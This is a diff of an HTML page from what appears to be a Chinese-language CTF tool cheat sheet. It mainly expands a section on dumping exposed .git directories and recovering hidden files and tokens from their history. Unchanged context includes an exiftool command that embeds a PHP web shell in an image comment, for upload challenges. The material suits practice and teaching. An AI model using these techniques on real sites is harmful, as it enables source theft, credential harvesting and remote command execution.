@@ -2095,6 +2095,78 @@
     </span>
   </a>
   
+    <nav class="md-nav" aria-label="5. git-dumper —— .git 源码泄露">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#51" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5.1 确认泄露
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#52" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5.2 拉下来
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#53-windows" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5.3 Windows 下拉完要先修（踩过两次）
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#54-flag" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5.4 按「flag 藏在哪」选命令
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#55" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5.5 不进工作区，直接读对象
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#56" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5.6 坑
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
 </li>
       
         <li class="md-nav__item">
@@ -4257,6 +4329,78 @@
     </span>
   </a>
   
+    <nav class="md-nav" aria-label="5. git-dumper —— .git 源码泄露">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#51" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5.1 确认泄露
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#52" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5.2 拉下来
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#53-windows" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5.3 Windows 下拉完要先修（踩过两次）
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#54-flag" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5.4 按「flag 藏在哪」选命令
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#55" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5.5 不进工作区，直接读对象
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#56" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5.6 坑
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
 </li>
       
         <li class="md-nav__item">
@@ -4731,69 +4875,143 @@
 <p>语法和 sqlmap 几乎一样。<strong>sqlmap 被 WAF 拦死、或者结果对不上时，换它交叉验证。</strong></p>
 <hr />
 <h2 id="5-git-dumper-git">5. git-dumper —— <code>.git</code> 源码泄露<a class="headerlink" href="#5-git-dumper-git" title="Permanent link">&para;</a></h2>
-<p>先确认泄露：</p>
-<div class="language-powershell highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="n">curl</span><span class="p">.</span><span class="n">exe</span> <span class="n">-s</span> <span class="s2">"http://target/.git/HEAD"</span>
-</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="c"># 回 "ref: refs/heads/main" 就是中招了</span>
+<p><code>.git</code> 泄露 = 整份源码 + 全部历史提交都能拿走。flag 可能藏在四个地方，按「藏在哪」查，别只会 <code>git log</code>。</p>
+<h3 id="51">5.1 确认泄露<a class="headerlink" href="#51" title="Permanent link">&para;</a></h3>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="n">curl</span><span class="p">.</span><span class="n">exe</span> <span class="n">-s</span> <span class="n">-o</span> <span class="n">NUL</span> <span class="n">-w</span> <span class="s1">'%{http_code}'</span> <span class="n">http</span><span class="p">://</span><span class="n">target</span><span class="p">/.</span><span class="n">git</span><span class="p">/</span><span class="n">HEAD</span>
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="n">curl</span><span class="p">.</span><span class="n">exe</span> <span class="n">-s</span> <span class="n">http</span><span class="p">://</span><span class="n">target</span><span class="p">/.</span><span class="n">git</span><span class="p">/</span><span class="n">HEAD</span>      <span class="c"># 回 "ref: refs/heads/main" 就是中招</span>
 </span></code></pre></div>
-<p>拉下来：</p>
-<div class="language-powershell highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="n">git-dumper</span> <span class="n">http</span><span class="p">://</span><span class="n">target</span><span class="p">/.</span><span class="n">git</span><span class="p">/</span> <span class="n">E</span><span class="p">:\</span><span class="n">dsh</span><span class="p">\</span><span class="n">ctf-work</span><span class="p">\</span><span class="n">dumped</span>
-</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="nb">cd </span><span class="n">E</span><span class="p">:\</span><span class="n">dsh</span><span class="p">\</span><span class="n">ctf-work</span><span class="p">\</span><span class="n">dumped</span>
-</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a><span class="n">git</span> <span class="n">log</span> <span class="p">-</span><span class="n">-oneline</span> <span class="p">-</span><span class="n">-all</span>
-</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a><span class="n">git</span> <span class="n">show</span> <span class="p">&lt;</span><span class="n">hash</span><span class="p">&gt;</span>
-</span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a><span class="n">git</span> <span class="n">ls-files</span>
+<p>顺手一起探，200 的都记下来：</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="nv">$B</span> <span class="p">=</span> <span class="s1">'http://target'</span>
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="s1">'/.git/HEAD'</span><span class="p">,</span><span class="s1">'/.git/config'</span><span class="p">,</span><span class="s1">'/.git/index'</span><span class="p">,</span><span class="s1">'/.git/packed-refs'</span><span class="p">,</span><span class="s1">'/.git/logs/HEAD'</span><span class="p">,</span><span class="s1">'/.git/refs/heads/main'</span> <span class="p">|</span>
+</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>  <span class="k">ForEach</span><span class="n">-Object</span> <span class="p">{</span> <span class="s1">'{0,-22} {1}'</span> <span class="o">-f</span> <span class="nv">$_</span><span class="p">,</span> <span class="p">(</span><span class="n">curl</span><span class="p">.</span><span class="n">exe</span> <span class="n">-s</span> <span class="n">-o</span> <span class="n">NUL</span> <span class="n">-w</span> <span class="s1">'%{http_code}'</span> <span class="s2">"$B$_"</span><span class="p">)</span> <span class="p">}</span>
 </span></code></pre></div>
-<p><strong>坑：</strong></p>
+<h3 id="52">5.2 拉下来<a class="headerlink" href="#52" title="Permanent link">&para;</a></h3>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="n">git-dumper</span> <span class="n">http</span><span class="p">://</span><span class="n">target</span><span class="p">/.</span><span class="n">git</span><span class="p">/</span> <span class="n">E</span><span class="p">:\</span><span class="n">dsh</span><span class="p">\</span><span class="n">ctf-work</span><span class="p">\</span><span class="n">dump_c1</span>
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a><span class="nb">cd </span><span class="n">E</span><span class="p">:\</span><span class="n">dsh</span><span class="p">\</span><span class="n">ctf-work</span><span class="p">\</span><span class="n">dump_c1</span>
+</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a><span class="n">git</span> <span class="p">-</span><span class="n">-no-pager</span> <span class="n">log</span> <span class="p">-</span><span class="n">-all</span> <span class="p">-</span><span class="n">-oneline</span> <span class="p">-</span><span class="n">-graph</span> <span class="p">-</span><span class="n">-decorate</span>
+</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a><span class="n">git</span> <span class="p">-</span><span class="n">-no-pager</span> <span class="n">branch</span> <span class="n">-a</span>
+</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a><span class="n">git</span> <span class="n">ls-files</span>
+</span></code></pre></div>
 <ul>
-<li>URL 必须<strong>以 <code>/.git/</code> 结尾</strong></li>
-<li>目录 403 也别放弃 —— 它照样会试 <code>objects/</code></li>
-<li>拉完先 <code>git log --all</code>，flag 常在被删掉的提交里</li>
+<li>URL <strong>必须 <code>/.git/</code> 结尾</strong></li>
+<li><strong>一题一个目录</strong>，复用会把几题的 objects 混在一起，<code>git log</code> 串题</li>
+<li>没有 git-dumper 用 GitHack：<code>python GitHack.py http://target/.git/</code></li>
 </ul>
-<p>手工兜底（没有 git-dumper 时）：</p>
-<div class="language-powershell highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="n">curl</span><span class="p">.</span><span class="n">exe</span> <span class="n">-s</span> <span class="s2">"http://target/.git/HEAD"</span>
-</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a><span class="n">curl</span><span class="p">.</span><span class="n">exe</span> <span class="n">-s</span> <span class="s2">"http://target/.git/refs/heads/main"</span>
-</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a><span class="n">curl</span><span class="p">.</span><span class="n">exe</span> <span class="n">-s</span> <span class="s2">"http://target/.git/index"</span>
+<h3 id="53-windows">5.3 Windows 下拉完要先修（踩过两次）<a class="headerlink" href="#53-windows" title="Permanent link">&para;</a></h3>
+<p>git-dumper 1.0.9 两个毛病，不修 git 直接不认仓库：</p>
+<table>
+<thead>
+<tr>
+<th>现象</th>
+<th>原因</th>
+<th>修法</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>fatal: not a git repository</code></td>
+<td>refs 全在 <code>packed-refs</code> 里时，它不建 <code>.git\refs</code> 目录</td>
+<td>手动建目录</td>
+</tr>
+<tr>
+<td><code>ignoring ref with broken name</code> / <code>trailing garbage: '?'</code></td>
+<td>用文本模式写 ref/log，Windows 下变 CRLF，<code>\r</code> 被当成 ref 名的一部分</td>
+<td>洗成 LF</td>
+</tr>
+</tbody>
+</table>
+<p>一次修好（补 <code>refs\</code> + 洗 CRLF）：</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="nb">New-Item</span> <span class="n">-ItemType</span> <span class="n">Directory</span> <span class="n">-Force</span> <span class="p">.</span><span class="n">git</span><span class="p">\</span><span class="n">refs</span> <span class="p">|</span> <span class="nb">Out-Null</span>
+</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a><span class="nv">$utf8</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Text</span><span class="p">.</span><span class="n">UTF8Encoding</span><span class="p">(</span><span class="nv">$false</span><span class="p">)</span>
+</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a><span class="k">foreach</span> <span class="p">(</span><span class="nv">$f</span> <span class="k">in</span> <span class="p">@(</span><span class="s1">'.git\HEAD'</span><span class="p">,</span><span class="s1">'.git\config'</span><span class="p">,</span><span class="s1">'.git\packed-refs'</span><span class="p">)</span> <span class="p">+</span> <span class="p">(</span><span class="nb">Get-ChildItem</span> <span class="n">-Recurse</span> <span class="o">-File</span> <span class="p">.</span><span class="n">git</span><span class="p">\</span><span class="n">logs</span> <span class="p">|</span> <span class="k">ForEach</span><span class="n">-Object</span> <span class="n">FullName</span><span class="p">))</span> <span class="p">{</span>
+</span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a>  <span class="nv">$t</span> <span class="p">=</span> <span class="no">[IO.File]</span><span class="p">::</span><span class="n">ReadAllText</span><span class="p">(</span><span class="nv">$f</span><span class="p">)</span>
+</span><span id="__span-11-5"><a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a>  <span class="no">[IO.File]</span><span class="p">::</span><span class="n">WriteAllText</span><span class="p">(</span><span class="nv">$f</span><span class="p">,</span> <span class="nv">$t</span><span class="p">.</span><span class="n">Replace</span><span class="p">(</span><span class="s2">"</span><span class="se">`r`n</span><span class="s2">"</span><span class="p">,</span><span class="s2">"</span><span class="se">`n</span><span class="s2">"</span><span class="p">),</span> <span class="nv">$utf8</span><span class="p">)</span>
+</span><span id="__span-11-6"><a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a><span class="p">}</span>
 </span></code></pre></div>
+<p>现成脚本：<code>E:\dsh\ctf-work\gitlab\fix-dump.ps1 -Path &lt;dump 目录&gt;</code>。</p>
+<h3 id="54-flag">5.4 按「flag 藏在哪」选命令<a class="headerlink" href="#54-flag" title="Permanent link">&para;</a></h3>
+<p><strong>① 提交过又删了</strong>（最常见）</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="n">git</span> <span class="p">-</span><span class="n">-no-pager</span> <span class="n">log</span> <span class="p">-</span><span class="n">-all</span> <span class="n">-S</span><span class="s2">"flag"</span> <span class="p">-</span><span class="n">-oneline</span>                      <span class="c"># 按内容增删过滤提交</span>
+</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a><span class="n">git</span> <span class="p">-</span><span class="n">-no-pager</span> <span class="n">log</span> <span class="p">-</span><span class="n">-all</span> <span class="p">-</span><span class="n">-diff-filter</span><span class="p">=</span><span class="n">D</span> <span class="p">-</span><span class="n">-name-only</span> <span class="p">-</span><span class="n">-oneline</span>   <span class="c"># 哪次删了哪个文件</span>
+</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a><span class="n">git</span> <span class="n">show</span> <span class="p">&lt;</span><span class="n">hash</span><span class="p">&gt;:</span><span class="n">flag</span><span class="p">.</span><span class="n">php</span>                                         <span class="c"># 直接从旧提交读文件</span>
+</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a><span class="n">git</span> <span class="n">checkout</span> <span class="p">&lt;</span><span class="n">hash</span><span class="p">&gt;</span> <span class="p">--</span> <span class="n">flag</span><span class="p">.</span><span class="n">php</span>                                  <span class="c"># 捞回工作区</span>
+</span></code></pre></div>
+<p><strong>② stash 里</strong>（工作区干净 ≠ 没有东西）</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="n">git</span> <span class="n">stash</span> <span class="n">list</span>
+</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a><span class="n">git</span> <span class="n">stash</span> <span class="n">show</span> <span class="n">-p</span> <span class="s1">'stash@{0}'</span>     <span class="c"># PowerShell 必须加引号，裸写 {0} 会被当脚本块</span>
+</span></code></pre></div>
+<p><code>stash@{0}</code> 不是 hash，是 <code>refs/stash</code> 的 <strong>reflog 第 0 条</strong>（最新；数字越大越旧）。reflog 丢了 <code>{0}</code> 解析不了，但 <code>.git/refs/stash</code> 里的 sha 还在，<code>git show &lt;sha&gt;</code> 照样出。</p>
+<p><strong>③ 别的分支</strong>（<code>branch -a</code> 之前先看 packed-refs）</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="nb">cat </span><span class="p">.</span><span class="n">git</span><span class="p">/</span><span class="n">packed-refs</span>              <span class="c"># refs 被 pack 时，分支名只在这里</span>
+</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a><span class="n">git</span> <span class="p">-</span><span class="n">-no-pager</span> <span class="n">branch</span> <span class="n">-a</span>
+</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a><span class="n">git</span> <span class="n">show</span> <span class="n">dev</span><span class="p">:</span><span class="n">internal</span><span class="p">/</span><span class="n">flag</span><span class="p">.</span><span class="n">php</span>
+</span></code></pre></div>
+<p><strong>④ 被删分支的悬空提交</strong></p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="n">git</span> <span class="n">fsck</span> <span class="p">-</span><span class="n">-lost-found</span>             <span class="c"># 打印 dangling commit，并写进 .git/lost-found/</span>
+</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a><span class="n">git</span> <span class="n">show</span> <span class="p">&lt;</span><span class="n">dangling</span> <span class="n">hash</span><span class="p">&gt;</span>
+</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a><span class="n">git</span> <span class="n">show</span> <span class="p">&lt;</span><span class="n">hash</span><span class="p">&gt;:</span><span class="n">run_debug</span><span class="p">.</span><span class="n">txt</span>
+</span></code></pre></div>
+<p><code>git fsck --full</code> <strong>不会</strong>报这种悬空：默认 fsck 把 reflog 当可达根，分支删了但 commit 还在 reflog 里时它认为「够得着」。要现形用 <code>--lost-found</code>（隐含 <code>--no-reflogs</code>）或 <code>--full --no-reflogs</code>。</p>
+<h3 id="55">5.5 不进工作区，直接读对象<a class="headerlink" href="#55" title="Permanent link">&para;</a></h3>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="n">git</span> <span class="n">rev-list</span> <span class="p">-</span><span class="n">-objects</span> <span class="p">-</span><span class="n">-all</span>      <span class="c"># 所有历史里出现过的文件名</span>
+</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a><span class="n">git</span> <span class="n">cat</span><span class="o">-file</span> <span class="n">-p</span> <span class="p">&lt;</span><span class="n">hash</span><span class="p">&gt;</span>            <span class="c"># 直接看 commit/tree/blob 原文</span>
+</span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a><span class="n">git</span> <span class="n">ls-files</span> <span class="n">-s</span>                   <span class="c"># index 里的 blob（git add 过没 commit 的也在）</span>
+</span><span id="__span-16-4"><a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a><span class="n">git</span> <span class="p">-</span><span class="n">-no-pager</span> <span class="n">config</span> <span class="p">-</span><span class="n">-list</span>      <span class="c"># remote URL 里常带 token</span>
+</span></code></pre></div>
+<p>手工兜底（没有 git-dumper 时，先看这几个文件）：</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="n">curl</span><span class="p">.</span><span class="n">exe</span> <span class="n">-s</span> <span class="s2">"http://target/.git/HEAD"</span>
+</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a><span class="n">curl</span><span class="p">.</span><span class="n">exe</span> <span class="n">-s</span> <span class="s2">"http://target/.git/packed-refs"</span>
+</span><span id="__span-17-3"><a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a><span class="n">curl</span><span class="p">.</span><span class="n">exe</span> <span class="n">-s</span> <span class="s2">"http://target/.git/index"</span>
+</span></code></pre></div>
+<h3 id="56">5.6 坑<a class="headerlink" href="#56" title="Permanent link">&para;</a></h3>
+<ul>
+<li>URL 不以 <code>/.git/</code> 结尾 → 拉不全或直接报错</li>
+<li><code>.git/</code> 目录 403/404 不代表没泄露，工具照样打 <code>objects/</code></li>
+<li>dump 目录复用 → 几关提交混在一起，自己干扰自己</li>
+<li><code>git log</code> 看着像没输出 → 被 less 接管了，命令一律加 <code>--no-pager</code></li>
+<li><code>stash@{0}</code>、<code>HEAD@{1}</code> 在 PowerShell 里必须单引号；串联命令用 <code>;</code> 不用 <code>&amp;&amp;</code></li>
+</ul>
 <hr />
 <h2 id="6-phpexe-php74">6. php.exe —— 本地跑 PHP（7.4）<a class="headerlink" href="#6-phpexe-php74" title="Permanent link">&para;</a></h2>
 <p>已在 PATH，<code>php</code> 就能用；绝对路径是 <code>E:\dsh\tools\php74\php.exe</code>。</p>
-<div class="language-powershell highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="n">php</span> <span class="n">-v</span>
-</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>
-</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a><span class="c"># 起本地靶场（-t 指定根目录，不加会 404）</span>
-</span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a><span class="n">php</span> <span class="n">-S</span> <span class="n">127</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">1</span><span class="p">:</span><span class="n">8080</span> <span class="n">-t</span> <span class="n">E</span><span class="p">:\</span><span class="n">dsh</span><span class="p">\</span><span class="n">ctf-work</span>
-</span><span id="__span-11-5"><a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a>
-</span><span id="__span-11-6"><a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a><span class="c"># 语法检查（写马之前先验一下，省得传上去 500）</span>
-</span><span id="__span-11-7"><a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a><span class="n">php</span> <span class="n">-l</span> <span class="n">shell</span><span class="p">.</span><span class="n">php</span>
-</span><span id="__span-11-8"><a id="__codelineno-11-8" name="__codelineno-11-8" href="#__codelineno-11-8"></a>
-</span><span id="__span-11-9"><a id="__codelineno-11-9" name="__codelineno-11-9" href="#__codelineno-11-9"></a><span class="c"># 算序列化 / 反序列化</span>
-</span><span id="__span-11-10"><a id="__codelineno-11-10" name="__codelineno-11-10" href="#__codelineno-11-10"></a><span class="n">php</span> <span class="n">-r</span> <span class="s2">"echo serialize(array('a'=&gt;1));"</span>
-</span><span id="__span-11-11"><a id="__codelineno-11-11" name="__codelineno-11-11" href="#__codelineno-11-11"></a><span class="n">php</span> <span class="n">-r</span> <span class="s2">"var_dump(unserialize('a:1:{s:1:\"</span><span class="n">a</span><span class="p">\</span><span class="s2">";i:1;}'));"</span>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="n">php</span> <span class="n">-v</span>
+</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a>
+</span><span id="__span-18-3"><a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a><span class="c"># 起本地靶场（-t 指定根目录，不加会 404）</span>
+</span><span id="__span-18-4"><a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a><span class="n">php</span> <span class="n">-S</span> <span class="n">127</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">1</span><span class="p">:</span><span class="n">8080</span> <span class="n">-t</span> <span class="n">E</span><span class="p">:\</span><span class="n">dsh</span><span class="p">\</span><span class="n">ctf-work</span>
+</span><span id="__span-18-5"><a id="__codelineno-18-5" name="__codelineno-18-5" href="#__codelineno-18-5"></a>
+</span><span id="__span-18-6"><a id="__codelineno-18-6" name="__codelineno-18-6" href="#__codelineno-18-6"></a><span class="c"># 语法检查（写马之前先验一下，省得传上去 500）</span>
+</span><span id="__span-18-7"><a id="__codelineno-18-7" name="__codelineno-18-7" href="#__codelineno-18-7"></a><span class="n">php</span> <span class="n">-l</span> <span class="n">shell</span><span class="p">.</span><span class="n">php</span>
+</span><span id="__span-18-8"><a id="__codelineno-18-8" name="__codelineno-18-8" href="#__codelineno-18-8"></a>
+</span><span id="__span-18-9"><a id="__codelineno-18-9" name="__codelineno-18-9" href="#__codelineno-18-9"></a><span class="c"># 算序列化 / 反序列化</span>
+</span><span id="__span-18-10"><a id="__codelineno-18-10" name="__codelineno-18-10" href="#__codelineno-18-10"></a><span class="n">php</span> <span class="n">-r</span> <span class="s2">"echo serialize(array('a'=&gt;1));"</span>
+</span><span id="__span-18-11"><a id="__codelineno-18-11" name="__codelineno-18-11" href="#__codelineno-18-11"></a><span class="n">php</span> <span class="n">-r</span> <span class="s2">"var_dump(unserialize('a:1:{s:1:\"</span><span class="n">a</span><span class="p">\</span><span class="s2">";i:1;}'));"</span>
 </span></code></pre></div>
 <hr />
 <h2 id="7-exiftool">7. exiftool —— 图片元信息 / 图片马<a class="headerlink" href="#7-exiftool" title="Permanent link">&para;</a></h2>
-<div class="language-powershell highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="nv">$ET</span> <span class="p">=</span> <span class="s1">'E:\dsh\tools\exiftool-13.59_64\exiftool.exe'</span>
-</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>
-</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a><span class="nv">$ET</span> <span class="n">1</span><span class="p">.</span><span class="n">jpg</span>                                  <span class="c"># 看全部元数据</span>
-</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a><span class="nv">$ET</span> <span class="n">-Comment</span><span class="p">=</span><span class="s2">"HELLO"</span> <span class="n">1</span><span class="p">.</span><span class="n">jpg</span>                 <span class="c"># 改注释</span>
-</span><span id="__span-12-5"><a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a><span class="nv">$ET</span> <span class="n">-Comment</span><span class="p">=</span><span class="s2">"&lt;?php system(\$_GET[1]);?&gt;"</span> <span class="n">-o</span> <span class="n">shell</span><span class="p">.</span><span class="n">jpg</span> <span class="n">1</span><span class="p">.</span><span class="n">jpg</span>   <span class="c"># 写马到副本</span>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="nv">$ET</span> <span class="p">=</span> <span class="s1">'E:\dsh\tools\exiftool-13.59_64\exiftool.exe'</span>
+</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a>
+</span><span id="__span-19-3"><a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a><span class="nv">$ET</span> <span class="n">1</span><span class="p">.</span><span class="n">jpg</span>                                  <span class="c"># 看全部元数据</span>
+</span><span id="__span-19-4"><a id="__codelineno-19-4" name="__codelineno-19-4" href="#__codelineno-19-4"></a><span class="nv">$ET</span> <span class="n">-Comment</span><span class="p">=</span><span class="s2">"HELLO"</span> <span class="n">1</span><span class="p">.</span><span class="n">jpg</span>                 <span class="c"># 改注释</span>
+</span><span id="__span-19-5"><a id="__codelineno-19-5" name="__codelineno-19-5" href="#__codelineno-19-5"></a><span class="nv">$ET</span> <span class="n">-Comment</span><span class="p">=</span><span class="s2">"&lt;?php system(\$_GET[1]);?&gt;"</span> <span class="n">-o</span> <span class="n">shell</span><span class="p">.</span><span class="n">jpg</span> <span class="n">1</span><span class="p">.</span><span class="n">jpg</span>   <span class="c"># 写马到副本</span>
 </span></code></pre></div>
 <p>上传题里「图片马 + 文件包含」这套经常用到。</p>
 <hr />
 <h2 id="8-sstimap-ssti">8. SSTImap —— SSTI 模板注入<a class="headerlink" href="#8-sstimap-ssti" title="Permanent link">&para;</a></h2>
 <p><strong>tplmap 的 Python 3 续作</strong>（tplmap 是 Python 2 的，已归档，跑不了）。装在 <code>E:\dsh\tools\SSTImap</code>。</p>
 <h3 id="_8">先记 <code>*</code> 的含义<a class="headerlink" href="#_8" title="Permanent link">&para;</a></h3>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>*  =  注入点标记，放在「你的输入会出现在哪儿」的位置
+<div class="language-text highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>*  =  注入点标记，放在「你的输入会出现在哪儿」的位置
 </span></code></pre></div>
 <h3 id="_9">三条命令<a class="headerlink" href="#_9" title="Permanent link">&para;</a></h3>
